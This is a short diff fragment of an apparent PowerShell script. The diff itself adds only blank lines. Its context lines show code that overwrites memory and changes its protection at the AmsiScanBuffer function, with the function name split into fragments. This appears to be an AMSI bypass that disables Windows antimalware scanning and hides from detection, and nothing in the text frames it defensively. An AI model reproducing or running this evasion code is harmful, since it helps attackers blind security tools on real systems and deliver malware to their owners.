@@ -47,6 +47,8 @@ $cm.Invoke($null, @($buf, 0, $sbA, 6))
 $vp.Invoke($sbA, 6, 0x20, [ref]$oldProtectionBuffer)
 
 
+
+
 #$apart1 = 'Ams'
 #$apart2 = 'iSca'
 #$apart3 = 'nBuf'
